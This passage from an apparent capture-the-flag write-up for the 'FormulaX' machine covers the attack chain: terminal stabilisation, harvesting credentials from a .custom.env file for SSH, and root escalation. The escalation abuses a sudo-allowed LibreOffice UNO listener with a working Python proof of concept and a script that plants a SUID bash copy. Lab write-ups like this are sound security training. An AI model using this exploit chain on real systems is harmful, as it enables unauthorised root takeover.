librenms@formulax:~$ export TERM=xterm
librenms@formulax:~$ export SHELL=bash
librenms@formulax:~$ stty rows 50 cols 184
```

* `script /dev/null -c bash`: Spawns a tty.
* `ctrl+z`: puts the shell in background for later doing a treatment.
* `stty raw -echo;fg`: gives the shell back again.
* `reset xterm`: resets the terminal to give the bash console.
* `export TERM=xterm`: let do ctrl+l to clean the terminal.
* `export SHELL=bash`: specifies the system that it's using a bash console.
* `stty rows <YOUR ROWS> cols <YOUR COLUMNS>`: sets the size of the current full terminal window. It is possible to view the right size for your window running `stty size` in a entire new window on your terminal.

# Access as kai_relay

Looking at configuration files of librenms, I saw a .custom.env, which has credentials for kai_relay:

```bash
cat .custom.env
```

![kai relay credential in env](/assets/images/FormulaX/kai_relay-credential-in-env.png)

Now I can ssh as that user:

```plaintext
❯ ssh kai_relay@10.10.11.6
kai_relay@10.10.11.6's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

<..SNIP>

kai_relay@formulax:~$ 
```

# Access as root

Looking at sudo privileges, I can run /usr/bin/office.sh as any user without password:

```shell
kai_relay@formulax:~$ sudo -l
Matching Defaults entries for kai_relay on forumlax:
    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset, timestamp_timeout=0

User kai_relay may run the following commands on forumlax:
    (ALL) NOPASSWD: /usr/bin/office.sh
```

This consist on a bash script that runs the following command:

```bash
kai_relay@formulax:~$ cat /usr/bin/office.sh 
#!/bin/bash
/usr/bin/soffice --calc --accept="socket,host=localhost,port=2002;urp;" --norestore --nologo --nodefault --headless
```

Searching this command on google, I can see is about a libreoffice command and something about python-uno. In the same search, I found [this article](https://hackdefense.com/publications/finding-rce-capabilities-in-the-apache-uno-api/) talking about RCE:

![command soffice search](/assets/images/FormulaX/command-soffice-search.png)

The command that executes /usr/bin/office.sh starts an Apache UNO server in localhost at port 2002.

Before taking a look at the article, I searched what is python uno and saw [this docs](http://www.openoffice.org/udk/python/python-bridge.html) of openoffice that says it can be used to use the OpenOffice API with python:

![what is python-uno](/assets/images/FormulaX/what-is-python-uno.png)

Also, in the article I saw before, gives a poc script that lets us execute commands in the python-uno server that I'm able to start because of the sudo privilege of before:

![poc apache uno](/assets/images/FormulaX/PoC-apache-uno.png)

Instead of calc.exe, I will modify it to execute /tmp/suid.sh, which will give suid permissions to a copy of bash in /tmp:

```python
import uno
from com.sun.star.system import XSystemShellExecute
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('--host', help='host to connect to', dest='host', required=True)
parser.add_argument('--port', help='port to connect to', dest='port', required=True)
args = parser.parse_args()
localContext = uno.getComponentContext()
resolver = localContext.ServiceManager.createInstanceWithContext(
"com.sun.star.bridge.UnoUrlResolver", localContext )
print("[+] Connecting to target...")
context = resolver.resolve(
"uno:socket,host={0},port={1};urp;StarOffice.ComponentContext".format(args.host,args.port))
service_manager = context.ServiceManager
print("[+] Connected to {0}".format(args.host))
shell_execute = service_manager.createInstance("com.sun.star.system.SystemShellExecute")
shell_execute.execute("/tmp/suid.sh", '',1)
```

Now I need two shells, one to start the UNO server and another to execute the python script:

**Shell 1**:
```bash
kai_relay@formulax:/tmp$ sudo /usr/bin/office.sh
```

**Shell 2**:

```bash
kai_relay@formulax:/tmp$ cat suid.sh 
#!/bin/bash

cp /bin/bash /tmp/
chmod u+s /tmp/bash
kai_relay@formulax:/tmp$ chmod +x suid.sh 
kai_relay@formulax:/tmp$ python3 poc.py 
usage: poc.py [-h] --host HOST --port PORT
poc.py: error: the following arguments are required: --host, --port
kai_relay@formulax:/tmp$ python3 poc.py --host localhost --port 2002
[+] Connecting to target...
[+] Connected to localhost
```

Now I have a /tmp/bash with SUID privileges:

```bash
kai_relay@formulax:/tmp$ ls -l bash 
-rwsr-xr-x 1 root root 1396520 Aug  3 17:26 bash
```

I can execute it and have root!:

```bash
kai_relay@formulax:/tmp$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/
bash-5.1# cat root.txt 
55****************************f0
```